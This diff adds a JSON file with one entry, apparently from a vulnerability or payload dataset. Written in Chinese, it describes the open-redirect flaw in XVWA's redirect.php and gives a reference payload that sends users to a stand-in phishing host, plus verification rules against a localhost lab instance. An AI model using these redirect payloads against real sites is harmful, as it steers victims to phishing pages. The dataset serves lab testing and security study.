@@ -1,0 +1,15 @@
+[
+  {
+    "id": "auto-20261030204019",
+    "context": "XVWA redirect 关卡：redirect.php 的 forward 参数直接拼进 HTTP 302 Location 头，无任何协议/域名白名单或同源校验，可任意跳转到攻击者控制的外部站点(钓鱼)。",
+    "reference_payload": "GET /xvwa/vulnerabilities/redirect/redirect.php?forward=https://evil-phishing.example.com/login  ->  HTTP/1.1 302 Found, Location: https://evil-phishing.example.com/login (另 //evil.example.com/phish 协议相对同样透传)",
+    "principle": "未验证的重定向参数直接写入 Location 响应头，攻击者可构造链接把受害者跳转到任意外部钓鱼/恶意站点。",
+    "source": "xvwa",
+    "verify_url": "http://localhost:8084/xvwa/vulnerabilities/redirect/redirect.php?forward={payload}",
+    "evidence": {
+      "verify": "echo",
+      "url": "http://localhost:8084/xvwa/vulnerabilities/redirect/redirect.php?forward={payload}",
+      "match": "302 Found 且 Location 头回显攻击者指定的外部 URL"
+    }
+  }
+]
